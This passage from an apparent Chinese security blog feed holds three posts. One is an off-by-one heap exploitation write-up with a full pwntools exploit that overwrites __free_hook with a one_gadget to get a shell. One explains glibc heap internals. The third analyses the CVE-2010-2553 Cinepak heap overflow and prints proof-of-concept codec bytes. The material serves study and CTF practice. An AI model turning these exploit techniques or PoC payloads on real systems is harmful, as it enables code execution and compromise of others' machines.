one_gadget</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload = p64(free_hook)</span><br><span class="line">edit(1,payload)</span><br><span class="line">edit(2, p64(one_gadget))</span><br><span class="line">remove(2)</span><br></pre></td></tr></table></figure><h3 id="exp-思路"><a href="#exp-思路" class="headerlink" title="exp(思路)"></a>exp(思路)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level="info"</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">binary = ELF(<span class="string">"b00ks"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.30.so"</span>)</span><br><span class="line">io = process(<span class="string">"./b00ks"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createbook</span><span class="params">(name_size, name, des_size, des)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(name_size))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(des_size))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printbook</span><span class="params">(id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(id):</span><br><span class="line">        book_id = int(io.readline()[:<span class="number">-1</span>])</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_name = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_des = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_author = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createname</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"name: "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changename</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"5"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editbook</span><span class="params">(book_id, new_des)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.writeline(str(book_id))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(new_des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletebook</span><span class="params">(book_id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(book_id))</span><br><span class="line"></span><br><span class="line">createname(<span class="string">"A"</span> * <span class="number">32</span>)</span><br><span class="line">createbook(<span class="number">128</span>, <span class="string">"a"</span>, <span class="number">32</span>, <span class="string">"a"</span>)</span><br><span class="line">createbook(<span class="number">0x21000</span>, <span class="string">"a"</span>, <span class="number">0x21000</span>, <span class="string">"b"</span>)</span><br><span class="line"></span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book1_addr = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"book1_address:"</span> + hex(book1_addr))</span><br><span class="line"></span><br><span class="line">payload =p64(<span class="number">1</span>) + p64(book1_addr + <span class="number">0x38</span>) * <span class="number">2</span> + p64(<span class="number">0xffff</span>) <span class="comment"># p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)</span></span><br><span class="line">editbook(book_id_1, payload)</span><br><span class="line">changename(<span class="string">"A"</span> * <span class="number">32</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"book2 name addr:"</span> + hex(book2_name_addr))</span><br><span class="line">log.success(<span class="string">"book2 des addr:"</span> + hex(book2_des_addr))</span><br><span class="line">libc_base = book2_des_addr + <span class="number">0x46ff0</span><span class="comment"># 0x68ff0</span></span><br><span class="line">log.success(<span class="string">"libc base:"</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">one_gadget = libc_base +<span class="number">0xe6b93</span> <span class="comment"># 0xe6b96 0xe6b99 0x10afa9</span></span><br><span class="line">log.success(<span class="string">"free_hook:"</span> + hex(free_hook))</span><br><span class="line">log.success(<span class="string">"one_gadget:"</span> + hex(one_gadget))</span><br><span class="line">editbook(<span class="number">1</span>, p64(free_hook) * <span class="number">2</span>)</span><br><span class="line">editbook(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/堆溢出-Off-By-One/">https://kabeor.github.io/堆溢出-Off-By-One/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-Off-By-One&quot;&gt;&lt;a href=&quot;#堆溢出-Off-By-One&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Off-By-One&quot;&gt;&lt;/a&gt;堆溢出-Off-By-One&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot;
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Glibc堆结构</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Glibc%E5%A0%86%E7%BB%93%E6%9E%84/"/>
    <id>https://kabeor.github.io/堆溢出-Glibc堆结构/</id>
    <published>2020-01-03T12:08:16.564Z</published>
    <updated>2020-01-03T12:08:39.150Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Glibc堆结构"><a href="#堆溢出-Glibc堆结构" class="headerlink" title="堆溢出-Glibc堆结构"></a>堆溢出-Glibc堆结构</h1><p>目前堆实现有如下几种</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dlmalloc  – General purpose allocator</span><br><span class="line">ptmalloc2 – glibc</span><br><span class="line">jemalloc  – FreeBSD and Firefox</span><br><span class="line">tcmalloc  – Google</span><br><span class="line">libumem   – Solaris</span><br></pre></td></tr></table></figure><p>本来linux默认的是dlmalloc，但是由于其不支持多线程堆管理，所以后来被支持多线程的prmalloc2代替了。</p><p>事实上在linux平台，*malloc本质上都是通过系统调用brk或者mmap实现的。</p><p><img src="https://i.loli.net/2020/01/02/YK3BIow1uPDQgAf.png" alt></p><p>在 glibc-2.3.x. 之后，glibc 中集成了 ptmalloc2。</p><blockquote><p>在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p></blockquote><p>内存结构如下</p><p><img src="https://i.loli.net/2020/01/02/IlP5E4GsKwoMuxJ.png" alt></p><h2 id="常见堆操作"><a href="#常见堆操作" class="headerlink" title="常见堆操作"></a>常见堆操作</h2><h3 id="malloc-size-t-n"><a href="#malloc-size-t-n" class="headerlink" title="malloc(size_t n)"></a>malloc(size_t n)</h3><p>malloc 函数返回对应大小字节的内存块的指针。</p><ul><li>当 n=0 时，返回当前系统允许的堆的最小内存块。</li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><h3 id="free-void-p"><a href="#free-void-p" class="headerlink" title="free(void* p)"></a>free(void* p)</h3><p>释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。</p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。</li></ul><h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。</p><p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li></ul><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>用户释放掉的 chunk 不会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。</p><p>ptmalloc 采用分箱式方法对空闲的 chunk 进行管理。首先，它会根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为 4 类：fast bins，small bins，large bins，unsorted bin。每类中仍然有更细的划分，相似大小的 chunk 会用双向链表链接起来。也就是说，在每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk。</p><p>对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。</p><h3 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h3><p>大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。<strong>因为我们把大部分时间花在了合并、分割以及中间检查的过程中。</strong>因此，ptmalloc 中专门设计了 fast bin，对应的变量就是 malloc state 中的 fastbinsY。</p><p>为了更加高效地利用 fast bin，glibc 采用单向链表对其中的每个 bin 进行组织，并且<strong>每个 bin 采取 LIFO 策略</strong>，最近释放的 chunk 会更早地被分配，所以会更加适合于局部性。也就是说，当用户需要的 chunk 的大小小于 fastbin 的最大大小时， ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk。如果没有的话，ptmalloc 才会做接下来的一系列操作。</p><h3 id="Small-Bin"><a href="#Small-Bin" class="headerlink" title="Small Bin"></a>Small Bin</h3><p>small bins 中一共有 62 个循环双向链表，每个链表中存储的 chunk 大小都一致。比如对于 32 位系统来说，下标 2 对应的双向链表中存储的 chunk 大小为均为 16 字节。每个链表都有链表头结点，这样可以方便对于链表内部结点的管理。此外，<strong>small bins 中每个 bin 对应的链表采用 FIFO 的规则</strong>，所以同一个链表中先被释放的 chunk 会先被分配出去。</p><h3 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h3><p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致</p><table><thead><tr><th style="text-align:left">组</th><th style="text-align:left">数量</th><th style="text-align:left">公差</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">32</td><td style="text-align:left">64B</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">16</td><td style="text-align:left">512B</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">8</td><td style="text-align:left">4096B</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">4</td><td style="text-align:left">32768B</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left">2</td><td style="text-align:left">262144B</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left">1</td><td style="text-align:left">不限制</td></tr></tbody></table><h3 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h3><p>unsorted bin 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区。</p><h2 id="堆的基本实现功能"><a href="#堆的基本实现功能" class="headerlink" title="堆的基本实现功能"></a>堆的基本实现功能</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来。</p><p>基本原理：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">定义三个堆块 A-P-C用双链表连接，现在要取出P</span><br><span class="line"></span><br><span class="line">FD = P-&gt;fd;  //定义P的前驱</span><br><span class="line">BK = P-&gt;bk;  //定义P的后继</span><br><span class="line">FD-&gt;bk = A; //令P的后继节点的前驱为A</span><br><span class="line">BK-&gt;fd = C; //令P的前驱节点的后继为C</span><br><span class="line"></span><br><span class="line">合并一下其实就是如下关系</span><br><span class="line">P-&gt;fd-&gt;bk = A</span><br><span class="line">P-&gt;bk-&gt;fd = C</span><br><span class="line"></span><br><span class="line">最后结果</span><br><span class="line">A-C   P取出</span><br></pre></td></tr></table></figure><p>unlink可能在以下地方使用：</p><ul><li><p>malloc</p><ul><li>从恰好大小合适的 large bin 中获取 chunk。<ul><li><strong>这里需要注意的是 fastbin 与 small bin 就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。</strong></li><li>依次遍历处理 unsorted bin 时也没有使用 unlink 。</li></ul></li><li>从比请求的 chunk 所在的 bin 大的 bin 中取 chunk。</li></ul></li><li><p>free</p><ul><li>后向合并，合并物理相邻低地址空闲 chunk。</li><li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li><li><p>malloc_consolidate</p><ul><li>后向合并，合并物理相邻低地址空闲 chunk。</li><li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li><li><p>realloc</p><ul><li>前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li></ul><p>unlink操作后，<strong>P 本身的 fd 和 bk 指针并没有发生变化</strong>，有时候可以使用这个方法来泄漏地址</p><ul><li>libc 地址<ul><li>P 位于双向链表头部，bk 泄漏</li><li>P 位于双向链表尾部，fd 泄漏</li><li>双向链表只包含一个空闲 chunk 时，P 位于双向链表中，fd 和 bk 均可以泄漏</li></ul></li><li><p>泄漏堆地址，双向链表包含多个空闲 chunk</p><ul><li>P 位于双向链表头部，fd 泄漏</li><li>P 位于双向链表中，fd 和 bk 均可以泄漏</li><li>P 位于双向链表尾部，bk 泄漏</li></ul></li><li><p>这里的头部指的是 bin 的 fd 指向的 chunk，即双向链表中最新加入的 chunk。</p></li><li>这里的尾部指的是 bin 的 bk 指向的 chunk，即双向链表中最先加入的 chunk。</li></ul><h3 id="malloc-printerr"><a href="#malloc-printerr" class="headerlink" title="malloc_printerr"></a>malloc_printerr</h3><p>在 glibc malloc 时检测到错误的时候，会调用 <code>malloc_printerr</code> 函数。<br>       主要会调用 <code>__libc_message</code> 来执行<code>abort</code> 函数。<br>       在<code>abort</code> 函数里，在 glibc 还是 2.23 版本时，会 fflush stream。</p><h3 id="堆初始化"><a href="#堆初始化" class="headerlink" title="堆初始化"></a>堆初始化</h3><p>堆初始化是在用户第一次申请内存时执行 malloc_consolidate 再执行 malloc_init_state 实现的。</p><h3 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h3><p>一般我们会使用 malloc 函数来申请内存块，其实该函数真正调用的是 <strong>libc_malloc 函数。此外，</strong>libc_malloc 函数只是用来简单封装 _int_malloc 函数。_int_malloc 才是申请内存块的核心。</p><p>需要了解的时候查<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/malloc-zh/" target="_blank" rel="noopener">ctf-wiki</a>就好，释放内存块类似</p><p>From <a href="https://kabeor.github.io/堆溢出-Glibc堆结构/">https://kabeor.github.io/堆溢出-Glibc堆结构/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-Glibc堆结构&quot;&gt;&lt;a href=&quot;#堆溢出-Glibc堆结构&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Glibc堆结构&quot;&gt;&lt;/a&gt;堆溢出-Glibc堆结构&lt;/h1&gt;&lt;p&gt;目前堆实现有如下几种&lt;/p&gt;
&lt;figure class=&quot;
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-2553 CVDecompress堆溢出分析</title>
    <link href="https://kabeor.github.io/CVE-2010-2553%20CVDecompress%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
    <id>https://kabeor.github.io/CVE-2010-2553 CVDecompress堆溢出分析/</id>
    <published>2019-12-31T09:10:27.505Z</published>
    <updated>2019-12-31T09:10:58.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2010-2553-CVDecompress堆溢出分析"><a href="#CVE-2010-2553-CVDecompress堆溢出分析" class="headerlink" title="CVE-2010-2553 CVDecompress堆溢出分析"></a>CVE-2010-2553 CVDecompress堆溢出分析</h1><h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><blockquote><p>Windows XP SP3 x86<br>Windbg 6.12.2.633<br>Windows Media Player 9.0.0.4503</p></blockquote><h3 id="Windbg符号表配置"><a href="#Windbg符号表配置" class="headerlink" title="Windbg符号表配置"></a>Windbg符号表配置</h3><p><img src="https://i.loli.net/2019/12/28/QHNyEZL9nvK7itO.png" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">srv*c:\Symbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure><p>微软Win7以后使用在线下载符号表机制，XP没有支持，所以只能从网上下载符号表离线包，但还是有些报错，可以复制报错路径，在c:\Symbols中创建该路径，然后将对应dll(C:\WINDOWS\Symbols\dll中)复制过来，如图<br><img src="https://i.loli.net/2019/12/28/q82lfNQ7aLEvsdP.png" alt></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>运行Media Player，windbg附加wmplayer.exe</p><h3 id="定位漏洞位置"><a href="#定位漏洞位置" class="headerlink" title="定位漏洞位置"></a>定位漏洞位置</h3><p>windbg下的gflags.exe可以辅助堆调试<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">调试选项</span><br><span class="line"></span><br><span class="line">htc-堆尾检查，在堆块末尾附加额外的标记信息（通常为8字节），用于检查堆块是否发生溢出。</span><br><span class="line">hfc-堆释放检查，在释放堆块时对堆进行各种检查，防止多次释放同一个堆块。</span><br><span class="line">hpc-堆参数检查，对传递给堆管理的参数进行更多的检查。</span><br><span class="line">ust-用户态栈回溯，即将每次调用堆函数的函数调用信息记录到一个数据库中。</span><br><span class="line">htg-堆标志，为堆块增加附加标记，以记录堆块的使用情况或其他信息。</span><br><span class="line">hvc-调用时验证，即每次调用堆函数时都对整个堆进行验证和检查。</span><br><span class="line">hpa-启用页堆，在堆块后增加专门用于检测溢出的栅栏页，若发生堆溢出触及栅栏页便会立刻触发异常。</span><br></pre></td></tr></table></figure></p><p>windbg中使用!gflag +hpa启用页堆检测<br>g继续运行程序，运行poc.avi<br>触发异常，kb显示调用栈<br><img src="https://i.loli.net/2019/12/28/wegijKQWNkElnHI.png" alt></p><p>ub查看反汇编，进入73b721ae产生异常，因此在73b7cbee处下断点<br><img src="https://i.loli.net/2019/12/28/mhGurxMwElo9YQd.png" alt></p><p>但如果直接下断点到73b7cbee不成功，因为该地址位于iccvid.dll模块中，而iccvid只在解析poc.avi时才会被动态加载，若重新附加进程运行，里面是没有iccvid.dl模块的。</p><p><strong>解决方法：在刚刚附加上进程时，通过”sxe ld:iccvid”命令，设置在iccvid.dll模块首次加载时断下</strong></p><p>重新加载，使用sxe ld:iccvid加载iccvid.dll模块并断下,g继续运行<br>播放poc.avi, lmm iccvid查看模块信息<br>bp下断<br>bl可看出模块列表<br>运行即可到达该断点位置</p><p><img src="https://i.loli.net/2019/12/28/DQUTP4BYCsOkHXx.png" alt></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>IDA分析iccvid.dll,并导入pdb，发现该漏洞位于__stdcall CVDecompress(x, x, x, x, x, x, x)函数中</p><p><img src="https://i.loli.net/2019/12/28/DWwT4rHdMLzCUO5.png" alt></p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B721E1 loc_73B721E1:                           <span class="comment">; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15↑j</span></span><br><span class="line"><span class="symbol">.text:</span>73B721E1                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B721E3                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_8], <span class="number">20h</span></span><br><span class="line"><span class="symbol">.text:</span>73B721E7                 <span class="keyword">jb</span>      loc_73B723ED</span><br><span class="line"><span class="symbol">.text:</span>73B721ED                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>73B721F0                 <span class="keyword">mov</span>     <span class="number">ah</span>, [<span class="built_in">esi</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B721F3                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">3</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B721F7                 <span class="keyword">mov</span>     <span class="built_in">al</span>, [<span class="built_in">esi</span>+<span class="number">2</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B721FA                 <span class="keyword">shl</span>     <span class="built_in">eax</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>73B721FD                 <span class="keyword">or</span>      <span class="built_in">eax</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>73B721FF                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_8], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B72202                 <span class="keyword">jl</span>      loc_73B723F4</span><br><span class="line"><span class="symbol">.text:</span>73B72208                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">esi</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B7220A                 <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_8+<span class="number">3</span>], <span class="built_in">cl</span></span><br><span class="line"><span class="symbol">.text:</span>73B7220D                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_10]</span><br><span class="line"><span class="symbol">.text:</span>73B72210                 <span class="keyword">push</span>    <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>73B72211                 <span class="keyword">push</span>    <span class="number">0Ah</span></span><br><span class="line"><span class="symbol">.text:</span>73B72213                 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B72214                 <span class="keyword">call</span>    _ULongSub@<span class="number">12</span>    <span class="comment">; ULongSub(x,x,x)</span></span><br><span class="line"><span class="symbol">.text:</span>73B72219                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B7221B                 <span class="keyword">jl</span>      loc_73B723F4</span><br><span class="line"><span class="symbol">.text:</span>73B72221                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B72223                 <span class="keyword">mov</span>     <span class="number">ah</span>, [<span class="built_in">esi</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B72226                 <span class="keyword">add</span>     <span class="built_in">esi</span>, <span class="number">0Ah</span></span><br><span class="line"><span class="symbol">.text:</span>73B72229                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_14], <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>73B7222C                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_18], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>73B7222F                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_C], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>73B72232                 <span class="keyword">mov</span>     <span class="built_in">al</span>, [<span class="built_in">esi</span>-<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B72235                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>73B72237                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_1C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B7223A                 <span class="keyword">jle</span>     loc_73B723EA</span><br><span class="line"><span class="symbol">.text:</span>73B72240                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">edi</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/28/vjZzI4Kbo7JH9qh.png" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cinepak_codec_data1 = &apos;\x00\x00\x00\x68\x01\x60\x01\x20&apos;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/28/27fA1yahwgdWtRu.png" alt></p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B72226                 <span class="keyword">add</span>     <span class="built_in">esi</span>, <span class="number">0Ah</span>  <span class="comment">;esi指向cinepak_codec_data2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cinepak_codec_data2 = <span class="string">'\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'</span></span><br></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B72246                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">16h</span>  <span class="comment">;判断未解压缩数据是否大于等于0x16</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span>73B722A9                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_4]  <span class="comment">;首次为0，循环递增到0x2000</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/28/dzRLiMa4jB6PqcH.png" alt></p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B723B9 loc_73B723B9:                           <span class="comment">; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15A↑j</span></span><br><span class="line"><span class="symbol">.text:</span>73B723B9                 <span class="keyword">movsx</span>   <span class="built_in">eax</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>73B723BD                 <span class="keyword">imul</span>    <span class="built_in">eax</span>, [<span 